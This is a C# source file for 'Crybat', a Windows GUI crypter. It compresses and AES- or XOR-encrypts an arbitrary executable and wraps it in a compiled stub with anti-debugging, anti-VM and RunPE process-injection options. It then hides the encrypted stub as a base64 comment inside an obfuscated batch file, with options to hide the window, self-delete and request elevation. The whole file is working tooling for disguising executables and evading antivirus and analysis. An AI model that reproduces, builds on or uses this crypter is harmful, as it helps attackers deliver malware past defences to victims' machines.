using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.CSharp;

using static Crybat.Utils;

namespace Crybat
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // Event handlers
        private void Form1_Load(object sender, EventArgs e)
        {
            SettingsObject obj = Settings.Load();
            if (obj != null) UnpackSettings(obj);
            Task.Factory.StartNew(CheckVersion);
            UpdateKeys(sender, e);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(0);
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            textBox1.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e) => Crypt();

        private void aesEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (aesEncryption.Checked) xorEncryption.Checked = false;
        }

        private void xorEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (xorEncryption.Checked) aesEncryption.Checked = false;
        }

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            listBox1.Items.Add(ofd.FileName);
        }

        private void removeFile_Click(object sender, EventArgs e)
        {
            listBox1.Items.Remove(listBox1.SelectedItem);
        }

        // Functions
        private void Crypt()
        {
            buildButton.Enabled = false;
            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
            listBox2.Items.Clear();

            Random rng = new Random();
            string _input = textBox1.Text;
            byte[] _key = Convert.FromBase64String(key1.Text);
            byte[] _iv = Convert.FromBase64String(iv1.Text);
            byte[] _stubkey = Convert.FromBase64String(key2.Text);
            byte[] _stubiv = Convert.FromBase64String(iv6.Text);
            EncryptionMode mode = xorEncryption.Checked ? EncryptionMode.XOR : EncryptionMode.AES;

            if (!File.Exists(_input))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            if (Path.GetExtension(_input) != ".exe")
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }

            Console.ForegroundColor = ConsoleColor.Gray;
            byte[] pbytes = File.ReadAllBytes(_input);
            bool isnetasm = IsAssembly(_input);

            if (isnetasm)
            {
                listBox2.Items.Add("Patching assembly...");
                pbytes = Patcher.Fix(pbytes);
            }

            listBox2.Items.Add("Encrypting payload...");
            byte[] payload_enc = Encrypt(mode, Compress(pbytes), _stubkey, _stubiv);

            listBox2.Items.Add("Creating stub...");
            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, !isnetasm, rng);

            listBox2.Items.Add("Building stub...");
            string tempfile = Path.GetTempFileName();
            File.WriteAllBytes("payload.exe", payload_enc);
            if (!isnetasm)
            {
                byte[] runpedll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Crybat.Resources.runpe.dll")), _stubkey, _stubiv);
                File.WriteAllBytes("runpe.dll", runpedll_enc);
            }
            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = "-optimize",
                IncludeDebugInformation = false
            };
            parameters.EmbeddedResources.Add("payload.exe");
            if (!isnetasm) parameters.EmbeddedResources.Add("runpe.dll");
            foreach (string item in listBox1.Items) parameters.EmbeddedResources.Add(item);
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                File.Delete("payload.txt");
                if (!isnetasm) File.Delete("runpe.dll");
                File.Delete(tempfile);
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            byte[] stubbytes = File.ReadAllBytes(tempfile);
            File.Delete("payload.exe");
            if (!isnetasm) File.Delete("runpe.dll");
            File.Delete(tempfile);

            listBox2.Items.Add("Encrypting stub...");
            byte[] stub_enc = Encrypt(mode, Compress(stubbytes), _key, _iv);

            listBox2.Items.Add("Creating batch file...");
            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, rng);
            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
            content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
            content = string.Join(Environment.NewLine, content_lines);

            SaveFileDialog sfd = new SaveFileDialog()
            {
                AddExtension = true,
                DefaultExt = "bat",
                Title = "Save File",
                Filter = "Batch files (*.bat)|*.bat",
                RestoreDirectory = true,
                FileName = Path.ChangeExtension(_input, "bat")
            };
            sfd.ShowDialog();

            listBox2.Items.Add("Writing output...");
            File.WriteAllText(sfd.FileName, content, Encoding.ASCII);

            MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            buildButton.Enabled = true;
        }

        private void CheckVersion()
        {
            try
            {
                WebClient wc = new WebClient();
                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/ch2sh/Crybat/main/version").Trim();
                wc.Dispose();
                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
                {
                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
                    if (currentversion != latestversion)
                    {
                        DialogResult result = MessageBox.Show($"Crybat {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
                        if (result == DialogResult.Yes)
                        {
                            Process.Start("https://github.com/ch2sh/Crybat/releases/tag/" + latestversion);
                        }
                    }
                }
                File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
            }
            catch { }
        }

        private void UpdateKeys(object sender, EventArgs e)
        {
            AesManaged aes = new AesManaged();
            key1.Text = Convert.ToBase64String(aes.Key);
            iv1.Text = Convert.ToBase64String(aes.IV);
            aes.Dispose();
            aes = new AesManaged();
            key2.Text = Convert.ToBase64String(aes.Key);
            iv6.Text = Convert.ToBase64String(aes.IV);
            aes.Dispose();
        }

        private void UnpackSettings(SettingsObject obj)
        {
            textBox1.Text = obj.inputFile;
            antiDebug.Checked = obj.antiDebug;
            antiVM.Checked = obj.antiVM;
            selfDelete.Checked = obj.selfDelete;
            hidden.Checked = obj.hidden;
            runas.Checked = obj.runas;
            aesEncryption.Checked = obj.aes;
            xorEncryption.Checked = obj.xor;
            listBox1.Items.AddRange(obj.bindedFiles);
        }

        private SettingsObject PackSettings()
        {
            SettingsObject obj = new SettingsObject()
            {
                inputFile = textBox1.Text,
                antiDebug = antiDebug.Checked,
                antiVM = antiVM.Checked,
                selfDelete = selfDelete.Checked,
                hidden = hidden.Checked,
                runas = runas.Checked,
                aes = aesEncryption.Checked,
                xor = xorEncryption.Checked
            };
            List<string> paths = new List<string>();
            foreach (string item in listBox1.Items) paths.Add(item);
            obj.bindedFiles = paths.ToArray();
            return obj;
        }
    }
}
